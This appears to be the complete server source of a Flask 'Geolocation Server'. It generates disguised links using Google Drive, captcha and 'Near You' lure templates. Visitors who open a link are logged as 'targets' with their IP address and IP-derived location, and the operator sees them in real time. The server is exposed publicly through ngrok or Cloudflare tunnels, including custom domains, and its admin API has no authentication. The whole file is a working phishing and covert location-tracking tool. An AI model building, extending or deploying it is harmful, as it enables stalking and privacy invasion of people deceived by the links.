from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory
import json
import os
import datetime
import uuid
import subprocess
import time
import re
import platform
import requests
import atexit
import tempfile
import shutil
import sys
import traceback
import select
from flask_socketio import SocketIO
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
# Simplified Socket.IO configuration to fix the 500 error
socketio = SocketIO(app, cors_allowed_origins="*")

DATABASE_DIR = 'database'
STATIC_DIR = os.path.join('static')
JS_DIR = os.path.join(STATIC_DIR, 'js')

for directory in [DATABASE_DIR, STATIC_DIR, JS_DIR]:
    if not os.path.exists(directory):
        os.makedirs(directory)

DATA_FILE = os.path.join(DATABASE_DIR, 'database.json')
CUSTOM_LINKS_FILE = os.path.join(DATABASE_DIR, 'custom_links.json')
IP_LOOKUP_FILE = os.path.join(DATABASE_DIR, 'ip_lookups.json')
NGROK_PROCESS = None
NGROK_URL = None
CLOUDFLARED_PROCESS = None
CLOUDFLARED_URL = None
CLOUDFLARED_TOKEN = None
CLOUDFLARED_CUSTOM_DOMAIN = None
CLOUDFLARED_CONFIG_PATH = None
ACTIVE_SESSIONS = {}

def load_targets():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            try:
                return json.load(f)
            except:
                return []
    return []

def save_target(target_data):
    targets = load_targets()
    targets.append(target_data)
    with open(DATA_FILE, 'w') as f:
        json.dump(targets, f, indent=2)
    return target_data

def load_custom_links():
    if os.path.exists(CUSTOM_LINKS_FILE):
        with open(CUSTOM_LINKS_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    save_custom_links({})
    return {}

def save_custom_links(links):
    with open(CUSTOM_LINKS_FILE, 'w') as f:
        json.dump(links, f, indent=2)

def load_ip_lookups():
    if os.path.exists(IP_LOOKUP_FILE):
        with open(IP_LOOKUP_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {}
    save_ip_lookups({})
    return {}

def save_ip_lookups(lookups):
    with open(IP_LOOKUP_FILE, 'w') as f:
        json.dump(lookups, f, indent=2)

def get_ip_info(ip_address):
    lookups = load_ip_lookups()
    
    if ip_address in lookups:
        return lookups[ip_address]
    
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        if response.status_code == 200:
            ip_data = response.json()
            lookups[ip_address] = ip_data
            save_ip_lookups(lookups)
            return ip_data
    except Exception as e:
        print(f"Error fetching IP info: {e}")
    
    return {}

def get_available_templates():
    templates = [
        {"id": "default", "name": "Default Template"},
        {"id": "nearyou", "name": "Near You"},
        {"id": "gdrive", "name": "Google Drive"},
        {"id": "captcha", "name": "Captcha Verification"}
    ]
    return templates

CUSTOM_LINKS = load_custom_links()

def is_ngrok_installed():
    try:
        subprocess.check_call(["ngrok", "version"], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL)
        return True
    except (subprocess.SubprocessError, FileNotFoundError):
        return False

def get_ngrok_url():
    try:
        response = subprocess.check_output(['curl', '-s', 'http://127.0.0.1:4040/api/tunnels'])
        tunnels = json.loads(response)
        if 'tunnels' in tunnels and tunnels['tunnels']:
            for tunnel in tunnels['tunnels']:
                if tunnel['proto'] == 'https':
                    return tunnel['public_url']
            return tunnels['tunnels'][0]['public_url']
    except:
        pass
    return None

def start_ngrok(port=5000):
    global NGROK_PROCESS, NGROK_URL
    if NGROK_PROCESS is not None:
        return get_ngrok_url()
    
    try:
        NGROK_PROCESS = subprocess.Popen(['ngrok', 'http', str(port)], 
                                          stdout=subprocess.DEVNULL, 
                                          stderr=subprocess.DEVNULL)
        time.sleep(2)
        NGROK_URL = get_ngrok_url()
        return NGROK_URL
    except Exception as e:
        print(f"Error starting ngrok: {e}")
        return None

def stop_ngrok():
    global NGROK_PROCESS, NGROK_URL
    if NGROK_PROCESS is not None:
        NGROK_PROCESS.terminate()
        NGROK_PROCESS = None
        NGROK_URL = None
        return True
    return False

def is_cloudflared_installed():
    try:
        subprocess.check_call(["cloudflared", "version"], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL)
        return True
    except (subprocess.SubprocessError, FileNotFoundError):
        return False

def install_cloudflared():
    system = platform.system().lower()
    architecture = platform.machine().lower()
    
    download_url = ""
    bin_path = ""
    
    if system == "linux":
        if "arm" in architecture or "aarch64" in architecture:
            download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
        else:
            download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        bin_path = "/usr/local/bin/cloudflared"
    elif system == "darwin":
        if "arm" in architecture or "aarch64" in architecture:
            download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64"
        else:
            download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
        bin_path = "/usr/local/bin/cloudflared"
    elif system == "windows":
        download_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        bin_path = os.path.join(os.environ.get("SYSTEMROOT", "C:\\Windows"), "cloudflared.exe")
    else:
        return False
    
    try:
        response = requests.get(download_url, stream=True)
        response.raise_for_status()
        
        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            shutil.copyfileobj(response.raw, tmp_file)
            tmp_path = tmp_file.name
        
        if system != "windows":
            os.chmod(tmp_path, 0o755)
            try:
                subprocess.check_call(["sudo", "mv", tmp_path, bin_path])
            except (subprocess.SubprocessError, FileNotFoundError):
                user_bin_dir = os.path.expanduser("~/.local/bin")
                os.makedirs(user_bin_dir, exist_ok=True)
                bin_path = os.path.join(user_bin_dir, "cloudflared")
                shutil.move(tmp_path, bin_path)
                os.environ["PATH"] += os.pathsep + user_bin_dir
        else:
            shutil.move(tmp_path, bin_path)
        
        return True
    except Exception as e:
        print(f"Error installing cloudflared: {e}")
        return False

def get_cloudflared_url():
    global CLOUDFLARED_URL
    return CLOUDFLARED_URL

def is_cloudflared_authenticated():
    try:
        result = subprocess.run(
            ["cloudflared", "tunnel", "list"],
            capture_output=True,
            text=True
        )
        
        if result.returncode == 0 and "Error locating origin cert" not in result.stderr:
            return True
        return False
    except Exception:
        return False

def get_auth_command():
    if platform.system().lower() == "windows":
        return "cloudflared.exe login"
    else:
        return "cloudflared login"

def kill_all_cloudflared_processes():
    if platform.system().lower() == "windows":
        try:
            subprocess.run("taskkill /f /im cloudflared.exe", shell=True, 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    else:
        try:
            subprocess.run("pkill -f cloudflared", shell=True, 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    time.sleep(1)

def delete_cloudflare_dns_via_api(domain):
    cf_api_token = os.getenv("CLOUDFLARE_API_TOKEN")
    cf_zone_id = os.getenv("CLOUDFLARE_ZONE_ID")
    
    if not cf_api_token or not cf_zone_id:
        print("CLOUDFLARE_API_TOKEN and CLOUDFLARE_ZONE_ID must be set in .env file")
        return False
    
    if not domain:
        return False
    
    print(f"Using Cloudflare API to delete DNS records for {domain}")
    
    try:
        headers = {
            "Authorization": f"Bearer {cf_api_token}",
            "Content-Type": "application/json"
        }
        
        response = requests.get(
            f"https://api.cloudflare.com/client/v4/zones/{cf_zone_id}/dns_records?per_page=50000",
            headers=headers
        )
        
        if not response.ok:
            print(f"Error fetching DNS records: {response.status_code} - {response.text}")
            return False
        
        records = response.json().get('result', [])
        deleted_count = 0
        
        for record in records:
            record_id = record.get('id')
            record_name = record.get('name', '')
            
            if domain in record_name:
                delete_response = requests.delete(
                    f"https://api.cloudflare.com/client/v4/zones/{cf_zone_id}/dns_records/{record_id}",
                    headers=headers
                )
                
                if delete_response.ok:
                    deleted_count += 1
                    print(f"Deleted DNS record: {record_name} ({record.get('type', '')})")
                else:
                    print(f"Failed to delete record {record_name}: {delete_response.status_code} - {delete_response.text}")
        
        print(f"Deleted {deleted_count} DNS records for {domain}")
        return True
        
    except Exception as e:
        print(f"Error in delete_cloudflare_dns_via_api: {str(e)}")
        traceback.print_exc()
        return False

def force_delete_dns_records(domain):
    if not domain:
        return False
    
    delete_cloudflare_dns_via_api(domain)
    
    print(f"Using CLI to delete DNS records for {domain}")
    
    try:
        subprocess.run(
            ["cloudflared", "tunnel", "route", "dns", "delete", domain],
            capture_output=True,
            timeout=15
        )
        
        dns_list = subprocess.run(
            ["cloudflared", "tunnel", "route", "dns", "list"],
            capture_output=True,
            text=True,
            timeout=15
        )
        
        if dns_list.returncode == 0:
            lines = dns_list.stdout.strip().split('\n')
            for line in lines:
                if domain in line:
                    parts = line.split()
                    if len(parts) >= 1:
                        route_domain = parts[0]
                        subprocess.run(
                            ["cloudflared", "tunnel", "route", "dns", "delete", route_domain],
                            capture_output=True,
                            timeout=15
                        )
    except Exception as e:
        print(f"Error in CLI force_delete_dns_records: {str(e)}")
    
    return True

def cleanup_existing_tunnels(domain=None):
    try:
        kill_all_cloudflared_processes()
        time.sleep(1)
        
        if domain:
            force_delete_dns_records(domain)
            
        try:
            result = subprocess.run(
                ["cloudflared", "tunnel", "list"],
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if result.returncode == 0:
                tunnels = []
                pattern = r'([a-f0-9-]{36})\s+(\S+)'
                for line in result.stdout.split('\n'):
                    match = re.search(pattern, line)
                    if match:
                        tunnel_id = match.group(1)
                        tunnel_name = match.group(2)
                        if 'geo-tunnel' in tunnel_name or (domain and domain in tunnel_name):
                            tunnels.append(tunnel_id)
                
                for tunnel_id in tunnels:
                    try:
                        subprocess.run(
                            ["cloudflared", "tunnel", "delete", "-f", tunnel_id],
                            capture_output=True,
                            timeout=15
                        )
                    except:
                        pass
        except:
            pass
        
        return True
    except Exception as e:
        print(f"Error during tunnel cleanup: {str(e)}")
        return False

def start_cloudflared(port=5000, custom_domain=None):
    global CLOUDFLARED_PROCESS, CLOUDFLARED_URL, CLOUDFLARED_TOKEN, CLOUDFLARED_CUSTOM_DOMAIN, CLOUDFLARED_CONFIG_PATH
    
    stop_cloudflared()
    kill_all_cloudflared_processes()
    time.sleep(2)
    
    CLOUDFLARED_PROCESS = None
    CLOUDFLARED_URL = None
    CLOUDFLARED_TOKEN = None
    CLOUDFLARED_CUSTOM_DOMAIN = None
    CLOUDFLARED_CONFIG_PATH = None
    
    if custom_domain:
        try:
            print(f"Starting tunnel with custom domain: {custom_domain}")
            CLOUDFLARED_CUSTOM_DOMAIN = custom_domain
            
            cleanup_existing_tunnels(custom_domain)
            delete_cloudflare_dns_via_api(custom_domain)
            time.sleep(1)
            
            tunnel_name = f"geo-tunnel-{int(time.time())}"
            
            print(f"Creating tunnel: {tunnel_name}")
            proc = subprocess.run(
                ["cloudflared", "tunnel", "create", tunnel_name],
                capture_output=True,
                text=True,
                timeout=15
            )
            
            if proc.returncode != 0:
                print(f"Error creating tunnel: {proc.stderr}")
                return None
            
            tunnel_id = None
            for line in proc.stdout.splitlines():
                if "Created tunnel" in line:
                    match = re.search(r'([a-f0-9-]{36})', line)
                    if match:
                        tunnel_id = match.group(1)
                    break
            
            if not tunnel_id:
                print("Could not extract tunnel ID")
                return None
            
            print(f"Successfully created tunnel with ID: {tunnel_id}")
            CLOUDFLARED_TOKEN = tunnel_id
            
            delete_cloudflare_dns_via_api(custom_domain)
            
            config_dir = os.path.join(os.path.expanduser('~'), '.cloudflared')
            os.makedirs(config_dir, exist_ok=True)
            config_path = os.path.join(config_dir, f"cf-tunnel-{tunnel_id}.yml")
            
            with open(config_path, 'w') as config_file:
                config_file.write(f"""
tunnel: {tunnel_id}
credentials-file: {os.path.expanduser('~')}/.cloudflared/{tunnel_id}.json
ingress:
  - hostname: {custom_domain}
    service: http://localhost:{port}
  - service: http_status:404
""")
            
            print(f"Created config file at {config_path}")
            CLOUDFLARED_CONFIG_PATH = config_path
            
            print(f"Routing DNS: {tunnel_id} -> {custom_domain}")
            route_proc = subprocess.run(
                ["cloudflared", "tunnel", "route", "dns", tunnel_id, custom_domain],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if route_proc.returncode != 0:
                print(f"DNS routing issue: {route_proc.stderr}")
                print("Attempting alternative DNS routing method...")
                
                try:
                    alt_route_proc = subprocess.run(
                        ["cloudflared", "tunnel", "dns", "create", custom_domain, tunnel_id],
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    if alt_route_proc.returncode != 0:
                        print(f"Alternative DNS routing also failed: {alt_route_proc.stderr}")
                    else:
                        print("Alternative DNS routing succeeded")
                except Exception as e:
                    print(f"Error in alternative DNS routing: {str(e)}")
            else:
                print("DNS routing successful")
            
            print("Waiting for DNS propagation (10 seconds)...")
            time.sleep(10)
            
            print(f"Starting tunnel: {tunnel_id} with config file")
            CLOUDFLARED_PROCESS = subprocess.Popen(
                ["cloudflared", "tunnel", "--config", config_path, "run"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            CLOUDFLARED_URL = f"https://{custom_domain}"
            
            print(f"Waiting for tunnel to establish...")
            for _ in range(30):
                time.sleep(1)
                if CLOUDFLARED_PROCESS.poll() is not None:
                    print(f"Tunnel process exited with code {CLOUDFLARED_PROCESS.poll()}")
                    stdout, stderr = CLOUDFLARED_PROCESS.communicate()
                    print(f"Stdout: {stdout}")
                    print(f"Stderr: {stderr}")
                    CLOUDFLARED_PROCESS = None
                    break
                
                try:
                    requests.get(CLOUDFLARED_URL, timeout=2)
                    print(f"Tunnel is accessible at {CLOUDFLARED_URL}")
                    return CLOUDFLARED_URL
                except Exception:
                    pass
            
            if CLOUDFLARED_PROCESS and CLOUDFLARED_PROCESS.poll() is None:
                print("Tunnel process is still running, returning URL")
                return CLOUDFLARED_URL
            else:
                print("Tunnel process failed or timed out")
                CLOUDFLARED_URL = None
                return None
                
        except Exception as e:
            print(f"Custom domain tunnel error: {str(e)}")
            traceback.print_exc()
            if CLOUDFLARED_PROCESS and CLOUDFLARED_PROCESS.poll() is None:
                CLOUDFLARED_PROCESS.terminate()
            CLOUDFLARED_PROCESS = None
            CLOUDFLARED_URL = None
            return None
    
    try:
        print("Starting quick tunnel")
        cmd = ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"]
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            timeout = time.time() + 15
            url = None
            
            while time.time() < timeout and url is None:
                if process.poll() is not None:
                    break
                
                readable, _, _ = select.select([process.stdout, process.stderr], [], [], 0.5)
                
                for stream in readable:
                    line = stream.readline()
                    if line:
                        print(f"Cloudflared output: {line.strip()}")
                        match = re.search(r"(https://[a-z0-9-]+\.trycloudflare\.com)", line)
                        if match:
                            url = match.group(1)
                            break
            
            if url:
                print(f"Found quick tunnel URL: {url}")
                CLOUDFLARED_PROCESS = process
                CLOUDFLARED_URL = url
                return url
            else:
                process.terminate()
                print("No URL found in cloudflared output")
                return None
                
        except Exception as e:
            print(f"Error in quick tunnel process: {str(e)}")
            traceback.print_exc()
            return None
            
    except Exception as e:
        print(f"Quick tunnel error: {str(e)}")
        traceback.print_exc()
        return None

def stop_cloudflared():
    global CLOUDFLARED_PROCESS, CLOUDFLARED_URL, CLOUDFLARED_TOKEN, CLOUDFLARED_CUSTOM_DOMAIN, CLOUDFLARED_CONFIG_PATH
    
    if CLOUDFLARED_PROCESS is not None:
        try:
            CLOUDFLARED_PROCESS.terminate()
            try:
                CLOUDFLARED_PROCESS.wait(timeout=5)
            except subprocess.TimeoutExpired:
                CLOUDFLARED_PROCESS.kill()
        except:
            pass
        CLOUDFLARED_PROCESS = None
    
    kill_all_cloudflared_processes()
    
    if CLOUDFLARED_CONFIG_PATH and os.path.exists(CLOUDFLARED_CONFIG_PATH):
        try:
            os.remove(CLOUDFLARED_CONFIG_PATH)
            print(f"Removed config file: {CLOUDFLARED_CONFIG_PATH}")
        except:
            pass
        CLOUDFLARED_CONFIG_PATH = None
    
    CLOUDFLARED_URL = None
    CLOUDFLARED_TOKEN = None
    CLOUDFLARED_CUSTOM_DOMAIN = None
    
    return True

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    elif request.headers.get('CF-Connecting-IP'):
        return request.headers.get('CF-Connecting-IP')
    return request.remote_addr

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

@app.route('/')
def index():
    return redirect(url_for('admin'))

@app.route('/admin')
def admin():
    return render_template('admin.html')

@app.route('/<custom_link>')
def custom_redirect(custom_link):
    if custom_link in CUSTOM_LINKS:
        CUSTOM_LINKS[custom_link]['visits'] += 1
        save_custom_links(CUSTOM_LINKS)
        
        socketio.emit('link_updated', {
            "id": custom_link,
            "name": CUSTOM_LINKS[custom_link]["name"],
            "created": CUSTOM_LINKS[custom_link]["created"],
            "visits": CUSTOM_LINKS[custom_link]["visits"],
            "template": CUSTOM_LINKS[custom_link].get("template", "default"),
            "redirect_url": CUSTOM_LINKS[custom_link].get("redirect_url", ""),
            "geo_mode": CUSTOM_LINKS[custom_link].get("geo_mode", "single")
        })
        
        template = CUSTOM_LINKS[custom_link].get('template', 'default')
        
        if template == 'default':
            return render_template('default/index.html', 
                                  redirect_url=CUSTOM_LINKS[custom_link].get("redirect_url", ""),
                                  geo_mode=CUSTOM_LINKS[custom_link].get("geo_mode", "single"))
        elif template == 'nearyou':
            return render_template('nearyou/index.html',
                                  redirect_url=CUSTOM_LINKS[custom_link].get("redirect_url", ""),
                                  geo_mode=CUSTOM_LINKS[custom_link].get("geo_mode", "single"))
        elif template == 'gdrive':
            return render_template('gdrive/index.html',
                                  redirect_url=CUSTOM_LINKS[custom_link].get("redirect_url", ""),
                                  geo_mode=CUSTOM_LINKS[custom_link].get("geo_mode", "single"))
        elif template == 'captcha':
            return render_template('captcha/index.html',
                                  redirect_url=CUSTOM_LINKS[custom_link].get("redirect_url", ""),
                                  geo_mode=CUSTOM_LINKS[custom_link].get("geo_mode", "single"))
        else:
            return render_template('default/index.html',
                                  redirect_url=CUSTOM_LINKS[custom_link].get("redirect_url", ""),
                                  geo_mode=CUSTOM_LINKS[custom_link].get("geo_mode", "single"))
    
    return "Not Found", 404

@app.route('/api/targets', methods=['GET'])
def get_targets():
    targets = load_targets()
    return jsonify(targets)

@app.route('/api/clear_history', methods=['POST'])
def clear_history():
    try:
        if os.path.exists(DATA_FILE):
            os.remove(DATA_FILE)
        with open(DATA_FILE, 'w') as f:
            json.dump([], f)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/submit', methods=['POST'])
def submit():
    data = request.json
    data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data['ip'] = get_client_ip()
    
    ip_info = get_ip_info(data['ip'])
    
    if ip_info:
        data['city'] = ip_info.get('city', '')
        data['region'] = ip_info.get('region', '')
        data['country'] = ip_info.get('country', '')
        data['loc'] = ip_info.get('loc', '')
        data['org'] = ip_info.get('org', '')
        data['postal'] = ip_info.get('postal', '')
        data['timezone'] = ip_info.get('timezone', '')
        data['isp'] = ip_info.get('org', '').split(' ')[0] if ip_info.get('org') else ''
    
    referer = request.headers.get('Referer', '')
    custom_link = None
    
    for link in CUSTOM_LINKS:
        if link in referer:
            custom_link = link
            data['source_link'] = custom_link
            data['link_name'] = CUSTOM_LINKS[custom_link]['name']
            break
    
    saved_data = save_target(data)
    socketio.emit('new_target', saved_data)
    return jsonify({"status": "success"})

@app.route('/api/create_link', methods=['POST'])
def create_link():
    data = request.json
    link_name = data.get('name', '')
    
    if not link_name:
        return jsonify({"status": "error", "message": "Link name is required"}), 400
    
    custom_id = data.get('custom_id')
    if not custom_id:
        custom_id = str(uuid.uuid4())[:8]
    
    if not re.match(r'^[a-zA-Z0-9-]+$', custom_id):
        return jsonify({"status": "error", "message": "Custom ID can only contain letters, numbers, and hyphens"}), 400
    
    if custom_id in CUSTOM_LINKS:
        return jsonify({"status": "error", "message": "This link ID already exists"}), 400
    
    template = data.get('template', 'default')
    redirect_url = data.get('redirect_url', '')
    geo_mode = data.get('geo_mode', 'single')
    
    if geo_mode not in ['single', 'watch']:
        geo_mode = 'single'
    
    CUSTOM_LINKS[custom_id] = {
        "name": link_name,
        "created": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "visits": 0,
        "template": template,
        "redirect_url": redirect_url,
        "geo_mode": geo_mode
    }
    
    save_custom_links(CUSTOM_LINKS)
    
    socketio.emit('link_created', {
        "id": custom_id,
        "name": link_name,
        "created": CUSTOM_LINKS[custom_id]["created"],
        "visits": 0,
        "template": template,
        "redirect_url": redirect_url,
        "geo_mode": geo_mode
    })
    
    base_url = request.host_url
    tunnel_url = None
    
    if NGROK_URL:
        tunnel_url = NGROK_URL
    elif CLOUDFLARED_URL:
        tunnel_url = CLOUDFLARED_URL
    
    if tunnel_url:
        base_url = tunnel_url
    
    return jsonify({
        "status": "success", 
        "id": custom_id, 
        "url": f"{base_url.rstrip('/')}/{custom_id}"
    })

@app.route('/api/links', methods=['GET'])
def get_links():
    links = []
    for link_id, link_data in CUSTOM_LINKS.items():
        links.append({
            "id": link_id,
            "name": link_data["name"],
            "created": link_data["created"],
            "visits": link_data["visits"],
            "template": link_data.get("template", "default"),
            "redirect_url": link_data.get("redirect_url", ""),
            "geo_mode": link_data.get("geo_mode", "single")
        })
    return jsonify(links)

@app.route('/api/delete_link/<link_id>', methods=['DELETE'])
def delete_link(link_id):
    if link_id in CUSTOM_LINKS:
        del CUSTOM_LINKS[link_id]
        save_custom_links(CUSTOM_LINKS)
        socketio.emit('link_deleted', {"id": link_id})
        return jsonify({"status": "success"})
    return jsonify({"status": "error", "message": "Link not found"}), 404

@app.route('/api/templates', methods=['GET'])
def get_templates():
    templates = get_available_templates()
    return jsonify(templates)

@app.route('/api/update_link_template', methods=['POST'])
def update_link_template():
    data = request.json
    link_id = data.get('link_id')
    template = data.get('template')
    
    if not link_id or not template:
        return jsonify({"status": "error", "message": "Link ID and template are required"}), 400
    
    if link_id not in CUSTOM_LINKS:
        return jsonify({"status": "error", "message": "Link not found"}), 404
    
    CUSTOM_LINKS[link_id]['template'] = template
    save_custom_links(CUSTOM_LINKS)
    
    socketio.emit('link_updated', {
        "id": link_id,
        "name": CUSTOM_LINKS[link_id]["name"],
        "created": CUSTOM_LINKS[link_id]["created"],
        "visits": CUSTOM_LINKS[link_id]["visits"],
        "template": template,
        "redirect_url": CUSTOM_LINKS[link_id].get("redirect_url", ""),
        "geo_mode": CUSTOM_LINKS[link_id].get("geo_mode", "single")
    })
    
    return jsonify({"status": "success"})

@app.route('/api/update_link_settings', methods=['POST'])
def update_link_settings():
    data = request.json
    link_id = data.get('link_id')
    redirect_url = data.get('redirect_url', '')
    geo_mode = data.get('geo_mode', 'single')
    
    if not link_id:
        return jsonify({"status": "error", "message": "Link ID is required"}), 400
    
    if link_id not in CUSTOM_LINKS:
        return jsonify({"status": "error", "message": "Link not found"}), 404
    
    if geo_mode not in ['single', 'watch']:
        geo_mode = 'single'
    
    CUSTOM_LINKS[link_id]['redirect_url'] = redirect_url
    CUSTOM_LINKS[link_id]['geo_mode'] = geo_mode
    save_custom_links(CUSTOM_LINKS)
    
    socketio.emit('link_updated', {
        "id": link_id,
        "name": CUSTOM_LINKS[link_id]["name"],
        "created": CUSTOM_LINKS[link_id]["created"],
        "visits": CUSTOM_LINKS[link_id]["visits"],
        "template": CUSTOM_LINKS[link_id].get("template", "default"),
        "redirect_url": redirect_url,
        "geo_mode": geo_mode
    })
    
    return jsonify({"status": "success"})

@app.route('/api/ngrok/status', methods=['GET'])
def ngrok_status():
    url = get_ngrok_url()
    return jsonify({
        "running": NGROK_PROCESS is not None,
        "url": url if url else None
    })

@app.route('/api/ngrok/start', methods=['POST'])
def start_ngrok_api():
    url = start_ngrok()
    if url:
        socketio.emit('ngrok_status', {
            "running": True,
            "url": url
        })
        return jsonify({"status": "success", "url": url})
    return jsonify({"status": "error", "message": "Failed to start ngrok"}), 500

@app.route('/api/ngrok/stop', methods=['POST'])
def stop_ngrok_api():
    result = stop_ngrok()
    socketio.emit('ngrok_status', {
        "running": False,
        "url": None
    })
    return jsonify({"status": "success" if result else "error"})

@app.route('/api/cloudflared/status', methods=['GET'])
def cloudflared_status():
    url = get_cloudflared_url()
    auth_status = is_cloudflared_authenticated()
    return jsonify({
        "running": CLOUDFLARED_PROCESS is not None,
        "url": url if url else None,
        "custom_domain": CLOUDFLARED_CUSTOM_DOMAIN,
        "authenticated": auth_status,
        "auth_command": get_auth_command() if not auth_status else None
    })

@app.route('/api/cloudflared/start', methods=['POST'])
def start_cloudflared_api():
    data = request.json or {}
    port = data.get('port', 5000)
    custom_domain = data.get('custom_domain')
    
    kill_all_cloudflared_processes()
    
    auth_status = is_cloudflared_authenticated()
    auth_command = get_auth_command()
    
    if custom_domain and not auth_status:
        socketio.emit('cloudflared_auth_required', {
            "command": auth_command,
            "message": "Authentication required for custom domains. Run this command in your terminal:"
        })
        return jsonify({
            "status": "error", 
            "message": "Authentication required for custom domains", 
            "authenticated": False,
            "auth_command": auth_command
        }), 400
    
    try:
        url = None
        
        if custom_domain and auth_status:
            print(f"Using custom domain: {custom_domain}")
            url = start_cloudflared(port=port, custom_domain=custom_domain)
            
            if url:
                print(f"Successfully established custom domain tunnel at {url}")
            else:
                print("Custom domain tunnel creation failed")
        
        if not url:
            print("Custom domain failed or not requested, using quick tunnel")
            url = start_cloudflared(port=port)
        
        if url:
            socketio.emit('cloudflared_status', {
                "running": True,
                "url": url,
                "custom_domain": CLOUDFLARED_CUSTOM_DOMAIN,
                "authenticated": auth_status
            })
            return jsonify({
                "status": "success", 
                "url": url, 
                "authenticated": auth_status,
                "custom_domain_active": CLOUDFLARED_CUSTOM_DOMAIN is not None
            })
        else:
            return jsonify({
                "status": "error", 
                "message": "Failed to start cloudflared tunnel", 
                "authenticated": auth_status
            }), 500
    
    except Exception as e:
        print(f"Exception in start_cloudflared_api: {str(e)}")
        traceback.print_exc()
        
        return jsonify({
            "status": "error", 
            "message": f"Error starting tunnel: {str(e)}", 
            "authenticated": auth_status
        }), 500

@app.route('/api/cloudflared/stop', methods=['POST'])
def stop_cloudflared_api():
    stop_cloudflared()
    kill_all_cloudflared_processes()
    
    socketio.emit('cloudflared_status', {
        "running": False,
        "url": None,
        "custom_domain": None,
        "authenticated": is_cloudflared_authenticated()
    })
    return jsonify({"status": "success"})

@app.route('/api/cloudflared/check_auth', methods=['GET'])
def check_cloudflared_auth():
    auth_status = is_cloudflared_authenticated()
    return jsonify({
        "authenticated": auth_status,
        "auth_command": get_auth_command() if not auth_status else None
    })

@app.route('/api/tunneling/check', methods=['GET'])
def check_tunneling_options():
    return jsonify({
        "ngrok_installed": is_ngrok_installed(),
        "cloudflared_installed": is_cloudflared_installed(),
        "cloudflared_authenticated": is_cloudflared_authenticated(),
        "cloudflared_auth_command": get_auth_command() if not is_cloudflared_authenticated() else None
    })

@socketio.on('connect')
def handle_connect():
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    print(f"Client disconnected: {request.sid}")

def cleanup_at_exit():
    print("Cleaning up before exit...")
    stop_ngrok()
    stop_cloudflared()

atexit.register(cleanup_at_exit)

if __name__ == '__main__':
    try:
        save_custom_links(CUSTOM_LINKS)
    except:
        pass
    
    print("Starting the Geolocation Server...")
    print("Checking for tunneling options...")
    
    if not is_ngrok_installed():
        print("Ngrok is not installed. You can install it from https://ngrok.com/download")
    
    if not is_cloudflared_installed():
        print("Cloudflared is not installed. Attempting to install automatically...")
        if install_cloudflared():
            print("Cloudflared installed successfully!")
        else:
            print("Failed to install Cloudflared.")
    
    print("\nServer starting on http://127.0.0.1:5000")
    print("Access the admin panel at http://127.0.0.1:5000/admin")
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
